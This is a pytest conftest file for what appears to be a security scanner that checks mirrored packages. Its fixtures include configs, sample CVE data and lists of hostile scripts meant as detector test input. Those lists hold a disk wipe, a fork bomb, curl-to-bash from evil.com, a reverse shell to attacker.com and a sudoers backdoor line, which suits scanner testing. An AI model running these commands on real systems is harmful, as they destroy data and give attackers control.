"""Pytest configuration and shared fixtures."""

import io
import gzip
import json
import tarfile
import zipfile
import pytest
from pathlib import Path
from unittest.mock import MagicMock, patch


@pytest.fixture
def sample_config():
    """Sample configuration dictionary."""
    return {
        "system": {
            "base_dir": "/opt/apt-mirror-system",
            "scans_dir": "/opt/apt-mirror-system/scans",
            "approvals_dir": "/opt/apt-mirror-system/approvals",
            "logs_dir": "/opt/apt-mirror-system/logs",
        },
        "scanner": {
            "type": "trivy",
            "timeout": 300,
            "workers": 4,
        },
        "policy": {
            "min_cvss_score": 7.0,
            "block_severities": ["CRITICAL", "HIGH"],
        },
        "logging": {
            "level": "INFO",
        },
        "formats": {
            "enabled": ["deb", "rpm", "wheel", "npm", "apk", "sdist"],
        },
    }


@pytest.fixture
def multi_format_config():
    """Configuration for multi-format scanning."""
    return {
        "formats": {
            "deb": {"enabled": True, "scanner": "trivy"},
            "rpm": {"enabled": True, "scanner": "trivy"},
            "wheel": {"enabled": True, "scanner": "pip-audit"},
            "sdist": {"enabled": True, "scanner": "pip-audit"},
            "npm": {"enabled": True, "scanner": "npm-audit"},
            "apk": {"enabled": True, "scanner": "trivy"},
        },
        "scanner": {
            "timeout": 300,
            "fallback": "trivy",
        },
        "policy": {
            "min_cvss_score": 7.0,
            "block_severities": ["CRITICAL", "HIGH"],
            "default_deny": True,
        },
    }


@pytest.fixture
def temp_scans_dir(tmp_path):
    """Create temporary scans directory for tests."""
    scans_dir = tmp_path / "scans"
    scans_dir.mkdir()
    return scans_dir


@pytest.fixture
def mock_trivy_scanner():
    """Mock Trivy scanner for unit tests."""
    with patch("src.scanner.scan_packages.PackageScanner._validate_scanner"):
        from src.scanner.scan_packages import PackageScanner
        scanner = PackageScanner.__new__(PackageScanner)
        scanner.scanner_type = "trivy"
        scanner.timeout = 60
        scanner.min_cvss_score = 7.0
        scanner.block_severities = ["CRITICAL", "HIGH"]
        yield scanner


@pytest.fixture
def mock_virus_scanner():
    """Mock ClamAV virus scanner for unit tests."""
    with patch("src.scanner.virus_scanner.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout=b"ClamAV 1.0.0")
        from src.scanner.virus_scanner import VirusScanner
        scanner = VirusScanner(timeout=60)
        yield scanner


@pytest.fixture
def sample_vulnerability():
    """Sample vulnerability dictionary for testing."""
    return {
        "cve_id": "CVE-2023-12345",
        "severity": "CRITICAL",
        "cvss_score": 9.8,
        "package": "libtest",
        "installed_version": "1.0.0",
        "fixed_version": "1.0.1",
        "title": "Test Vulnerability",
        "description": "A critical test vulnerability",
    }


@pytest.fixture
def sample_vulnerabilities():
    """List of sample vulnerabilities for testing."""
    return [
        {
            "cve_id": "CVE-2023-11111",
            "severity": "CRITICAL",
            "cvss_score": 9.8,
            "package": "openssl",
        },
        {
            "cve_id": "CVE-2023-22222",
            "severity": "HIGH",
            "cvss_score": 8.5,
            "package": "libxml2",
        },
        {
            "cve_id": "CVE-2023-33333",
            "severity": "MEDIUM",
            "cvss_score": 5.5,
            "package": "zlib",
        },
        {
            "cve_id": "CVE-2023-44444",
            "severity": "LOW",
            "cvss_score": 2.0,
            "package": "bash",
        },
    ]


@pytest.fixture
def dangerous_shell_scripts():
    """Collection of dangerous shell scripts for testing."""
    return {
        "rm_rf_root": "#!/bin/bash\nrm -rf /",
        "curl_pipe_bash": "#!/bin/bash\ncurl https://evil.com/script.sh | bash",
        "chmod_777": "#!/bin/bash\nchmod 777 /etc/passwd",
        "fork_bomb": "#!/bin/bash\n:(){ :|:& };:",
        "dd_wipe": "#!/bin/bash\ndd if=/dev/zero of=/dev/sda bs=1M",
        "eval_injection": "#!/bin/bash\neval $(curl https://evil.com/cmd)",
        "reverse_shell": "#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/443 0>&1",
        "sudoers_mod": "#!/bin/bash\necho 'evil ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
    }


@pytest.fixture
def safe_shell_scripts():
    """Collection of safe shell scripts for testing."""
    return {
        "simple_echo": "#!/bin/bash\necho 'Hello, World!'",
        "copy_file": "#!/bin/bash\ncp /usr/share/doc/pkg/* /tmp/doc/",
        "mkdir": "#!/bin/bash\nmkdir -p /var/lib/myapp",
        "chmod_normal": "#!/bin/bash\nchmod 644 /etc/myapp.conf",
        "systemctl": "#!/bin/bash\nsystemctl restart myservice",
    }


@pytest.fixture
def dangerous_python_scripts():
    """Collection of dangerous Python scripts for testing."""
    return {
        "os_system": "import os\nos.system('rm -rf /')",
        "subprocess_call": "import subprocess\nsubprocess.call(['rm', '-rf', '/'])",
        "eval_code": "code = get_input()\neval(code)",
        "exec_code": "code = download_code()\nexec(code)",
        "pickle_rce": "import pickle\npickle.loads(untrusted_data)",
    }


@pytest.fixture
def dangerous_npm_scripts():
    """Collection of dangerous NPM scripts for testing."""
    return {
        "child_process": "const { exec } = require('child_process');\nexec('rm -rf /')",
        "eval": "const code = getCode();\neval(code)",
        "function_ctor": "const fn = new Function('return eval(x)');\nfn()",
    }


# Note: fixtures from tests/fixtures/conftest.py are auto-discovered by pytest
